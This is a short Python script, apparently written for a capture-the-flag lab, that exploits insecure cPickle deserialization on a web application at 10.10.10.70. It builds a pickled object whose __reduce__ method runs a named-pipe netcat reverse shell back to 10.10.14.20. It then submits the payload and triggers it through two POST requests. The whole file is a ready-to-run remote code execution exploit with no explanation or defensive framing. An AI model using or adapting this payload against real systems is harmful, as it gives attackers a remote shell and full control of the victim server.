#cPickle deserialization rce
import cPickle
from hashlib import md5
import os 
import requests
import urllib

proxies =  { 'http':'http://127.0.0.1:8080'}
class shell(object):
	def __reduce__(self):
        	return (os.system,("rm -f /var/tmp/backpipe; mknod /var/tmp/backpipe p; nc 10.10.14.20 53 0</var/tmp/backpipe | /bin/bash 1>/var/tmp/backpipe",))


quote = cPickle.dumps(shell())
char = "(S'homer'\n"
p_id = md5(char+quote).hexdigest()

s=requests.Session()

data={
	'character':char,
	'quote':quote
}
r=s.post("http://10.10.10.70/submit", data=data ,proxies=proxies)

data ={
	'id':p_id
}
r=s.post("http://10.10.10.70/check", data=data, proxies=proxies)
